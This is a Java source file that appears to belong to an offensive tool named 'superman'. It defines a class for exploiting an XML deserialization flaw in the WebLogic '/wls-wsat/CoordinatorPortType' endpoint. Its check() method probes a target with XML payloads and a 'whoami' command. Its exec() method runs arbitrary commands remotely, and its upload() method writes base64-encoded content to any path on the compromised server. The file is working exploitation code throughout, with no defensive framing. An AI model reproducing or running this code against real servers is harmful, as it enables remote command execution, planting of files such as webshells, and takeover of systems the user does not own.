package superman.vuls;

import sun.misc.BASE64Encoder;
import superman.core.Log;
import superman.payloads.XmlEchoPayload;
import superman.util.HttpClient;
import superman.util.HttpResult;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public abstract class XmlDeserailVul implements EchoVul {
    protected String protocol;
    protected String host;
    protected int port;
    protected String url;
    protected XmlEchoPayload payload;
    protected List<XmlEchoPayload> payloads;

    protected abstract void initPayloads();

    @Override
    public String check(String protocol, String host, int port) {
        this.protocol = protocol;
        this.host = host;
        this.port = port;
        this.url=protocol+"://"+ host +":"+port+"/wls-wsat/CoordinatorPortType";
        initPayloads();
        for(XmlEchoPayload payload:payloads){
            Log.info("检查payload:" + payload.getClass().getSimpleName());
            Map<String, String> headers = new HashMap<String, String>();
            headers.put("Content-type", "text/xml");
            headers.put("type", "exec");
            headers.put("cmd", "whoami");
            HttpResult res = null;
            try {
                res = HttpClient.post(url, payload.getXml().getBytes(), headers);
            } catch (Exception e) {
                e.printStackTrace();
                return null;
            }
            if(res!=null){
                List<String> isVul=res.getHeaders().get("isVul");
                if(isVul!=null){
                    this.payload=payload;
                    return res.getData().trim();
                }
            }
        }
        return null;
    }

    @Override
    public String exec(String cmd) {
        Map<String, String> headers = new HashMap<String, String>();
        headers.put("Content-type", "text/xml");
        headers.put("type", "exec");
        headers.put("cmd", cmd);
        HttpResult res = null;
        try {
            res = HttpClient.post(url, payload.getXml().getBytes(), headers);
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
        if(res!=null){
            List<String> isVul=res.getHeaders().get("isVul");
            if(isVul!=null){
                return res.getData().trim();
            }
        }
        return null;
    }

    @Override
    public void upload(String path, String text) {
        Map<String, String> headers = new HashMap<String, String>();
        headers.put("Content-type", "text/xml");
        headers.put("type", "upload");
        headers.put("path", path);
        String s=null;
        try {
            s=URLEncoder.encode(new BASE64Encoder().encode(text.getBytes()),"utf-8");
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        headers.put("text", s);
        try {
            HttpResult res = HttpClient.post(url, payload.getXml().getBytes(), headers);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void remove() {

    }
}
